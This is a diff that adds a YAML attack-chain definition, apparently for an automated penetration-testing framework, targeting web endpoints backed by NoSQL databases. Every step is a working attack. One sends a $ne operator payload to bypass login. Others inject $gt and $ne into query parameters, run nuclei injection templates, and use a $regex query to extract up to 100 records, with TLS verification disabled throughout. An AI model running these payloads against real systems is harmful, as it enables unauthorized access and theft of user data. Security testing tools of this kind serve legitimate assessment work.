@@ -1,0 +1,63 @@
+name: "NoSQL Injection & Auth Bypass Chain"
+description: "Detect NoSQL injection in JSON/query parameters, bypass authentication with operator payloads, and extract sensitive records."
+category: web
+attack_vector: "NoSQLi → authentication bypass → data extraction"
+variables:
+  url:
+    required: true
+    description: "Target endpoint (e.g. http://host/api/login or /api/users)"
+cutting_edge: true
+references: ["OWASP NoSQL Injection", "MongoDB operator injection payloads"]
+
+steps:
+  - name: "auth_bypass_probe"
+    tool: "curl_request"
+    description: "Send $ne operator payload to bypass authentication"
+    args:
+      url: "{{url}}"
+      method: "POST"
+      headers: 'Content-Type: application/json'
+      data: '{"username": {"$ne": null}, "password": {"$ne": null}}'
+      follow_redirects: true
+      insecure: true
+    expected_output: "200|token|success|session"
+    timeout: 60
+    gate: true
+    retries: 1
+
+  - name: "param_injection_probe"
+    tool: "curl_request"
+    description: "Test URL-encoded $gt operator injection in query params"
+    args:
+      url: "{{url}}?id[$gt]=&role[$ne]=admin"
+      method: "GET"
+      follow_redirects: true
+      insecure: true
+    expected_output: null
+    timeout: 60
+    gate: false
+    retries: 1
+
+  - name: "nuclei_nosql_scan"
+    tool: "nuclei_scan"
+    description: "Run nuclei NoSQL injection templates"
+    args:
+      target: "{{url}}"
+      templates: "http/injections"
+    expected_output: null
+    timeout: 600
+    gate: false
+    retries: 0
+
+  - name: "data_extraction"
+    tool: "curl_request"
+    description: "Attempt to extract sensitive records via $regex operator"
+    args:
+      url: "{{url}}?username[$regex]=.*&limit=100"
+      method: "GET"
+      follow_redirects: true
+      insecure: true
+    expected_output: null
+    timeout: 60
+    gate: false
+    retries: 0
